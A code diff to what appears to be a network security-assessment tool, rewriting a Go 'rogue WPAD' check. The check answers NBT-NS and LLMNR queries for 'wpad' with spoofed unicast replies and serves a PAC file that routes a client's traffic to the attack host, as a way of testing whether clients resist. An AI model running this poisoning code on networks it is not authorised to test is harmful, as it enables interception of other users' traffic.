@@ -1,20 +1,23 @@
 // wpad.go implements the rogue WPAD check. Impact temporary, restore decay
-// with a 30 s bound, affects clients: the NBT-NS and LLMNR answers point
-// clients at the attack leg's IPv4 for the wpad name with a 30 s TTL, after
-// which a client asks again. The PAC listener binds loopback and closes
-// before the behavior returns, so the answer's port serves nothing to a
-// client once the run moves on. The HTTP handler does not capture
-// authentication exchanges or forward proxy traffic.
+// with a 30 s bound, affects clients: the NBT-NS or LLMNR answer points
+// the client that asked at the attack leg's IPv4 for the wpad name with a
+// 30 s TTL, after which the client asks again. The PAC listener binds the
+// attack leg's IPv4 on port 80 and closes before the behavior returns, so
+// the answer serves nothing to a client once the run moves on. The HTTP
+// handler does not capture authentication exchanges or forward proxy
+// traffic.
 
 package routing
 
 import (
 	"context"
 	"encoding/json"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
 	"strconv"
+	"sync"
 	"time"
 
 	"github.com/gopacket/gopacket"
@@ -31,6 +34,9 @@ import (
 // wpadPacTTL is the decay bound: clients re-fetch the PAC after this TTL.
 const wpadPacTTL = 30 // seconds
 
+// wpadPacPath is the path a client fetches the PAC from.
+const wpadPacPath = "/wpad.dat"
+
 // wpadFinding is the finding detail for the WPAD behavior.
 type wpadFinding struct {
 	Action string `json:"action"`
@@ -40,33 +46,51 @@ type wpadFinding struct {
 	Port   int    `json:"port"`
 }
 
-// wpadState holds the embedded proxy's runtime state.
+// wpadState holds the embedded proxy's runtime state: the listener, its
+// port, the server, and the request log the handler appends to.
 type wpadState struct {
 	listener net.Listener
 	port     int
 	server   *http.Server
+
+	mu       sync.Mutex
+	requests []string
+	fetched  chan struct{} // closed on the first request for the PAC path
+	once     sync.Once
 }
 
-// RunWPAD announces the attack leg's own IPv4 as wpad over NBT-NS and
-// LLMNR, then serves a TTL-bound PAC from a listener opened through
-// deps.Listen on loopback and closed before return, while the answers
-// point clients at the leg's IPv4. The behavior reads no target: the
-// name and the transaction IDs are probe content. The verdict is pending:
-// whether a client fetched the PAC needs the listener's request log it does
-// not have. A bind failure carries [catalog.ErrCodeWPADPortCollision].
-// Concurrent calls require separate dependencies.
+// log records one request path and signals the first PAC fetch.
+func (s *wpadState) log(path string) {
+	s.mu.Lock()
+	s.requests = append(s.requests, path)
+	s.mu.Unlock()
+	if path == wpadPacPath {
+		s.once.Do(func() { close(s.fetched) })
+	}
+}
+
+// RunWPAD opens the PAC listener on the attack leg's IPv4, port 80, waits
+// for an NBT-NS or LLMNR query for the wpad name within the window,
+// answers it unicast to the query's source MAC, IPv4, and UDP port with
+// the query's id and the leg's IPv4, and reads the listener's request log.
+// The behavior reads no target. The predicate is a request for /wpad.dat
+// on the listener: one within the window confirms that a client fetched
+// the PAC, a query answered without one resists, and no query within the
+// window is pending with nothing sent. A bind failure carries
+// [catalog.ErrCodeWPADPortCollision]. Concurrent calls require separate
+// dependencies.
 func RunWPAD(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	addr := deps.AttackLeg.Addr()
 	qname := "wpad"
 	answerIP := addr.IPv4
 
-	state, err := startWPADProxy(ctx, deps.Listen)
+	state, err := startWPADProxy(ctx, deps.Listen, net.JoinHostPort(answerIP.String(), "80"))
 	if err != nil {
 		// Port collision: named coded error, not a crash.
 		return check.Verdict{}, errs.New().
 			Code(catalog.ErrCodeWPADPortCollision).
 			UserMsg("WPAD proxy port collision").
-			Hint("free the port or let the OS choose").
+			Hint("free port 80 on the attack leg's address").
 			Msgf("wpad: bind proxy listener: %v", err)
 	}
 	defer func() {
@@ -74,23 +98,37 @@ func RunWPAD(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 		_ = state.listener.Close()
 	}()
 
-	nbnsPkt, err := craftNBTNSResponse(addr.MAC, qname, answerIP)
+	var query wpadQuery
+	found, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
+		q, ok := isWPADQuery(data, addr.MAC)
+		if ok {
+			query = q
+		}
+		return ok
+	})
 	if err != nil {
-		return check.Verdict{}, errs.Wrap(err, "wpad: craft nbt-ns")
+		if ctx.Err() != nil {
+			return check.Verdict{}, ctx.Err()
+		}
+		return check.Verdict{}, errs.Wrap(err, "wpad: receive query")
 	}
-	if err := deps.AttackLeg.Send(ctx, nbnsPkt); err != nil {
-		return check.Verdict{}, errs.Wrap(err, "wpad: send nbt-ns")
+	if found == nil {
+		return check.Pending(fmt.Sprintf("no wpad query in %s", pre.Elapsed.Round(time.Millisecond))), nil
 	}
 
-	llmnrPkt, err := craftLLMNRResponse(addr.MAC, qname, answerIP)
-	if err != nil {
-		return check.Verdict{}, errs.Wrap(err, "wpad: craft llmnr")
+	var answer []byte
+	if query.llmnr {
+		answer, err = craftLLMNRResponse(addr.MAC, query, qname, answerIP)
+	} else {
+		answer, err = craftNBTNSResponse(addr.MAC, query, qname, answerIP)
 	}
-	if err := deps.AttackLeg.Send(ctx, llmnrPkt); err != nil {
-		return check.Verdict{}, errs.Wrap(err, "wpad: send llmnr")
+	if err != nil {
+		return check.Verdict{}, errs.Wrap(err, "wpad: craft answer")
+	}
+	if err := deps.AttackLeg.Send(ctx, answer); err != nil {
+		return check.Verdict{}, errs.Wrap(err, "wpad: send answer")
 	}
 
-	// Emit the finding.
 	detail := wpadFinding{
 		Action: "wpad-rogue-proxy",
 		Query:  qname,
@@ -101,17 +139,28 @@ func RunWPAD(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	detailBytes, _ := json.Marshal(detail)
 	deps.Emitter.Finding("wpad", detailBytes)
 
-	return check.Pending("no observable: PAC fetch needs the listener's request log"), nil
+	remaining := deps.Observe - pre.Elapsed
+	timer := time.NewTimer(remaining)
+	defer timer.Stop()
+	start := time.Now()
+	select {
+	case <-ctx.Done():
+		return check.Verdict{}, ctx.Err()
+	case <-state.fetched:
+		return check.Confirmed("a client fetched the PAC", pre.Elapsed+time.Since(start)), nil
+	case <-timer.C:
+		return check.Resisted(fmt.Sprintf("no PAC fetch in %s", remaining.Round(time.Millisecond)), deps.Observe), nil
+	}
 }
 
 // startWPADProxy starts an embedded HTTP server on a listener from listen
-// serving a TTL-bound PAC response. The PAC redirects all traffic to the
-// attacker. ctx bounds only the goroutine that serves the listener, so a
-// panic there is reported with the caller's trace correlation. Stopping the
-// server itself means closing state.server and state.listener, not ctx.
-func startWPADProxy(ctx context.Context, listen func(context.Context, string, string) (net.Listener, error)) (*wpadState, error) {
-	// Bind on a free port (port 0 = OS-chosen).
-	ln, err := listen(ctx, "tcp", "127.0.0.1:0")
+// bound to address, serving a TTL-bound PAC response and logging each
+// request path. The PAC redirects all traffic to the attacker. ctx bounds
+// only the goroutine that serves the listener, so a panic there is
+// reported with the caller's trace correlation. Stopping the server itself
+// means closing state.server and state.listener, not ctx.
+func startWPADProxy(ctx context.Context, listen func(context.Context, string, string) (net.Listener, error), address string) (*wpadState, error) {
+	ln, err := listen(ctx, "tcp", address)
 	if err != nil {
 		return nil, err
 	}
@@ -119,9 +168,15 @@ func startWPADProxy(ctx context.Context, listen func(context.Context, string, st
 	if tcp, ok := ln.Addr().(*net.TCPAddr); ok {
 		port = tcp.Port
 	}
+	state := &wpadState{listener: ln, port: port, fetched: make(chan struct{})}
 
 	mux := http.NewServeMux()
-	mux.HandleFunc("/wpad.dat", func(w http.ResponseWriter, r *http.Request) {
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		state.log(r.URL.Path)
+		if r.URL.Path != wpadPacPath {
+			http.NotFound(w, r)
+			return
+		}
 		w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
 		w.Header().Set("Cache-Control", "max-age="+strconv.Itoa(wpadPacTTL))
 		// PAC: direct to attacker proxy for all destinations.
@@ -129,7 +184,7 @@ func startWPADProxy(ctx context.Context, listen func(context.Context, string, st
 		_, _ = io.WriteString(w, pac)
 	})
 
-	srv := &http.Server{
+	state.server = &http.Server{
 		Handler:           mux,
 		ReadHeaderTimeout: 5 * time.Second,
 		// The PAC body is a handful of bytes. A client that needs longer
@@ -140,18 +195,21 @@ func startWPADProxy(ctx context.Context, listen func(context.Context, string, st
 	}
 
 	spawn.Go(ctx, "netpen wpad proxy serve", func() {
-		_ = srv.Serve(ln) //nolint:errcheck // shutdown via Close
+		// Serve returns ErrServerClosed once Close runs in the deferred
+		// shutdown; nothing else reads that result.
+		_ = state.server.Serve(ln)
 	})
 
-	return &wpadState{listener: ln, port: port, server: srv}, nil
+	return state, nil
 }
 
-// craftNBTNSResponse builds an NBT-NS response: Ethernet → IPv4 →
-// UDP(137) → NBNS response with the attacker's IP as the answer for
-// "wpad". Uses the owned [nl.NBNS] layer.
-func craftNBTNSResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
+// craftNBTNSResponse builds an NBT-NS response to q: Ethernet → IPv4 →
+// UDP(137) → NBNS response with the attacker's IP as the answer for the
+// name, sent unicast to the querier with the query's id. Uses the owned
+// [nl.NBNS] layer.
+func craftNBTNSResponse(src net.HardwareAddr, q wpadQuery, qname string, answerIP net.IP) ([]byte, error) {
 	nbns := &nl.NBNS{
-		ID:      0x1234,
+		ID:      q.id,
 		Flags:   0x8500, // response, authoritative
 		QDCount: 0,
 		ANCount: 1,
@@ -168,20 +226,20 @@ func craftNBTNSResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]
 
 	eth := &layers.Ethernet{
 		SrcMAC:       src,
-		DstMAC:       broadcastMAC,
+		DstMAC:       q.srcMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
 		Version:  4,
 		IHL:      5,
-		TTL:      1,
+		TTL:      64,
 		Protocol: layers.IPProtocolUDP,
 		SrcIP:    answerIP,
-		DstIP:    net.IPv4(255, 255, 255, 255),
+		DstIP:    q.srcIP,
 	}
 	udp := &layers.UDP{
 		SrcPort: 137,
-		DstPort: 137,
+		DstPort: q.srcPort,
 	}
 	_ = udp.SetNetworkLayerForChecksum(ip)
 	return craft.Default(eth, ip, udp, nbns)
@@ -197,12 +255,13 @@ func nbnsNodeAddress(ip net.IP) []byte {
 	return data
 }
 
-// craftLLMNRResponse builds an LLMNR response: Ethernet → IPv4 →
-// UDP(5355) → LLMNR response with the attacker's IP as the answer for
-// "wpad". Uses the owned [nl.LLMNR] layer.
-func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
+// craftLLMNRResponse builds an LLMNR response to q: Ethernet → IPv4 →
+// UDP(5355) → LLMNR response with the attacker's IP as the answer for the
+// name, sent unicast to the querier with the query's id (RFC 4795 sections
+// 2.1.1 and 2.3). Uses the owned [nl.LLMNR] layer.
+func craftLLMNRResponse(src net.HardwareAddr, q wpadQuery, qname string, answerIP net.IP) ([]byte, error) {
 	llmnr := &nl.LLMNR{
-		ID:      0x5678,
+		ID:      q.id,
 		Flags:   0x8000, // response
 		QDCount: 0,
 		ANCount: 1,
@@ -219,20 +278,20 @@ func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]
 
 	eth := &layers.Ethernet{
 		SrcMAC:       src,
-		DstMAC:       src, // link-local: the leg's own MAC
+		DstMAC:       q.srcMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
 		Version:  4,
 		IHL:      5,
-		TTL:      1,
+		TTL:      64,
 		Protocol: layers.IPProtocolUDP,
 		SrcIP:    answerIP,
-		DstIP:    net.IPv4(224, 0, 0, 252), // LLMNR multicast
+		DstIP:    q.srcIP,
 	}
 	udp := &layers.UDP{
 		SrcPort: 5355,
-		DstPort: 5355,
+		DstPort: q.srcPort,
 	}
 	_ = udp.SetNetworkLayerForChecksum(ip)
 	return craft.Default(eth, ip, udp, llmnr)
